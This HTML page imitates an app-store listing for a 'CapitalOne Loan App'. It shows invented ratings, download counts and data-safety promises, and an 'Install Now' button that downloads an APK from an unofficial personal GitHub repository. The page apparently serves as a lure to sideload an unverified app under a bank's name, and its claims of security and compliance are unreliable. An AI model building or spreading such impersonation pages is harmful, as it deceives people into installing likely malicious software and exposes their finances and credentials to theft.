
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>CapitalOne Loan App</title>
  <style>
    :root{
      --primary:#0044cc;
      --divider:#ddd;
      --muted:#666;
    }
    body{font-family:sans-serif;margin:0;background:#f9f9f9;color:#111}
    .hero{
      padding:24px 16px;
      text-align:center;
      background:#fff;
      border-bottom:1px solid var(--divider);
      box-shadow:0 1px 6px rgba(0,0,0,.06);
    }
    .title h1{
      margin:0;
      font-size:26px;
      color:#222;
    }
    .subtitle{
      font-size:15px;
      color:var(--muted);
      margin-top:4px;
    }
    .metrics{
      display:flex;
      align-items:center;
      justify-content:center;
      gap:16px;
      margin-top:14px;
      flex-wrap:wrap
    }
    .metrics .badge{
      background:#eee;
      padding:4px 10px;
      border-radius:8px;
      font-size:12px;
    }
    .primary-cta{
      display:inline-block;
      margin:20px auto;
      padding:14px 28px;
      background:var(--primary);
      color:#fff;
      font-weight:bold;
      text-decoration:none;
      border-radius:25px;
      font-size:16px;
      box-shadow:0 3px 8px rgba(0,0,0,.2);
      transition:all .2s ease;
    }
    .primary-cta:hover{
      background:#0033a3;
      transform:translateY(-2px);
    }
    section{margin:16px}
    .card{
      background:#fff;
      padding:20px;
      border-radius:14px;
      box-shadow:0 2px 8px rgba(0,0,0,.06);
    }
    .sec-head{
      display:flex;
      justify-content:space-between;
      align-items:center;
      margin-bottom:10px
    }
    .sec-head h2{margin:0;font-size:18px}
    .chips{display:flex;flex-wrap:wrap;gap:8px;margin-top:8px}
    .chip{
      background:#f0f0f0;
      padding:6px 12px;
      border-radius:20px;
      font-size:13px;
    }
    .safety .srow{
      display:flex;
      align-items:flex-start;
      gap:8px;
      margin-top:8px
    }
    .safety .dot{
      width:8px;
      height:8px;
      border-radius:50%;
      background:var(--primary);
      margin-top:6px
    }
    .muted{color:var(--muted)}
    .tiny{font-size:12px}
    .nav{
      position:sticky;
      bottom:0;
      background:#fff;
      border-top:1px solid var(--divider);
      box-shadow:0 -1px 6px rgba(0,0,0,.05);
    }
    .nav ul{
      margin:0;
      display:flex;
      list-style:none;
      padding:10px 12px;
      justify-content:space-around;
      color:var(--muted)
    }
    .nav li{
      display:grid;
      place-items:center;
      font-size:12px
    }
    .nav .i{font-size:20px}
    @media (min-width:768px){
      .hero,.card{max-width:820px;margin:0 auto}
      section{max-width:820px;margin:12px auto}
    }
  </style>
</head>
<body>
  
  <div class="hero">
    <div class="title">
      <h1>CapitalOne Loan App</h1>
      <div class="subtitle">Easy Loans, Quick Approval</div>
    </div>
    <div class="metrics">
      <div><span class="star">★</span> <strong>4.8</strong> <span class="muted tiny">16K+ reviews</span></div>
      <div class="badge">50k+ Downloads</div>
      <div class="badge">Rated for 4+</div>
    </div>

    <a class="primary-cta"
       href="https://github.com/koi-batija/apk/raw/refs/heads/main/CapitalOne%20UK%20..apk" 
       download
       target="_blank"
       rel="noopener noreferrer"
       >Install Now</a>
  </div>

  <section>
    <div class="card">
      <div class="sec-head">
        <h2>About this app</h2>
        <div class="arrow">➔</div>
      </div>
      <p class="muted">Get instant loans with flexible repayment options. CapitalOne Loan App makes borrowing easy, safe, and transparent with just a few taps.</p>
      <div class="chips">
        <span class="chip">Instant Loan</span>
        <span class="chip">Low Interest</span>
        <span class="chip">Secure</span>
        <span class="chip">Fast Approval</span>
        <span class="chip">24/7 Support</span>
      </div>
    </div>
  </section>
  
  <section>
    <div class="card">
      <div class="sec-head">
        <h2>Data safety</h2>
        <div class="arrow">➔</div>
      </div>
      <div class="safety">
        <div class="srow">
          <div class="dot"></div>
          <p>Your personal data is encrypted and never shared without consent.</p>
        </div>
        <div class="srow">
          <div class="dot"></div>
          <p>CapitalOne ensures regulatory compliance and safe lending practices.</p>
        </div>
      </div>
    </div>
  </section>
  
  <nav class="nav">
    <ul>
      <li><div class="i">🏠</div>Home</li>
      <li><div class="i">💰</div>Loans</li>
      <li><div class="i">📊</div>EMI Calc</li>
      <li><div class="i">👤</div>Profile</li>
    </ul>
  </nav>

</body>
</html>
